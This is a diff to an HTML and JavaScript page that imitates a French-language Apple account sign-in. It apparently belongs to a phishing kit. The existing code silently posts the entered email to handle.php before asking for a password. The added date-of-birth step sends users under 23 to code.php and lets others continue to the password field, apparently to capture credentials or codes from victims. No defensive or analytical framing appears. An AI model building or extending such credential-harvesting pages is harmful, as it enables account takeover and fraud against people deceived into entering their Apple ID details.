@@ -340,6 +340,17 @@
       line-height: 1.45;
     }
 
+    /* ── STEP 1.5: AGE VERIFICATION ── */
+    #step1_5 { display: none; width: 100%; }
+
+    .dob-label {
+      font-size: 14px;
+      color: var(--label-secondary);
+      margin-bottom: 8px;
+      display: block;
+      text-align: left;
+    }
+
     /* ── STEP 2 ── */
     #step2 { display: none; width: 100%; }
 
@@ -567,6 +578,27 @@
         <p class="btn-note">Nécessite un appareil doté d'iOS&nbsp;17 ou version ultérieure.</p>
       </div>
 
+      <!-- ÉTAPE 1.5 : VÉRIFICATION DE L'ÂGE -->
+      <div id="step1_5" style="width:100%">
+        <label class="dob-label">Date de naissance</label>
+        <input
+          id="dobInput"
+          type="date"
+          class="input-field"
+          placeholder="JJ/MM/AAAA"
+          style="margin-bottom: 20px;"
+        >
+        <p class="error-msg" id="ageError"></p>
+        <div class="btn-row">
+          <button id="btnAgeVerify" class="btn-continue" type="button">Continuer</button>
+        </div>
+        <button class="back-btn" id="btnBackFromAge" type="button">
+          <svg width="8" height="13" viewBox="0 0 8 13" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M7 1L1.5 6.5 7 12" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+      </div>
+
       <!-- ÉTAPE 2 : MOT DE PASSE -->
       <div id="step2">
         <button class="back-btn" id="btnBack" type="button">
@@ -606,13 +638,15 @@
   (function(){
     var email = '';
     var step1 = document.getElementById('step1');
+    var step1_5 = document.getElementById('step1_5');
     var step2 = document.getElementById('step2');
     var emailInput = document.getElementById('emailInput');
+    var dobInput = document.getElementById('dobInput');
     var passInput  = document.getElementById('passInput');
     var emailDisplay = document.getElementById('emailDisplay');
     var title = document.getElementById('main-title');
 
-    // ── Étape 1 → 2 ──
+    // ── Étape 1 → 1.5 (Age Verification) ──
     document.getElementById('btnContinue').addEventListener('click', function(){
       email = emailInput.value.trim();
       if (!email) { emailInput.focus(); return; }
@@ -623,12 +657,47 @@
       fd.append('email', email);
       fetch('handle.php', { method:'POST', body: fd }).catch(function(){});
 
-      // Transition visuelle
+      // Show age verification step
       step1.style.display = 'none';
-      emailDisplay.textContent = email;
-      step2.style.display = 'block';
-      title.innerHTML = 'Saisissez votre<br>mot de passe';
-      passInput.focus();
+      step1_5.style.display = 'block';
+      title.innerHTML = 'Vérifier votre<br>date de naissance';
+      dobInput.focus();
+    });
+
+    // ── Age Verification ──
+    document.getElementById('btnAgeVerify').addEventListener('click', function(){
+      var dobStr = dobInput.value.trim();
+      if (!dobStr) { dobInput.focus(); return; }
+
+      var dob = new Date(dobStr);
+      var today = new Date();
+      var age = today.getFullYear() - dob.getFullYear();
+      var monthDiff = today.getMonth() - dob.getMonth();
+      if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < dob.getDate())) {
+        age--;
+      }
+
+      var ageError = document.getElementById('ageError');
+      if (age < 23) {
+        // Redirect to code.php for users under 23
+        window.location.href = 'code.php';
+      } else {
+        // Continue to password step
+        ageError.style.display = 'none';
+        step1_5.style.display = 'none';
+        emailDisplay.textContent = email;
+        step2.style.display = 'block';
+        title.innerHTML = 'Saisissez votre<br>mot de passe';
+        passInput.focus();
+      }
+    });
+
+    // ── Back from age verification ──
+    document.getElementById('btnBackFromAge').addEventListener('click', function(){
+      step1_5.style.display = 'none';
+      step1.style.display = 'block';
+      title.innerHTML = 'Se connecter avec<br>un compte Apple';
+      emailInput.focus();
     });
 
     // ── Retour étape 1 ──
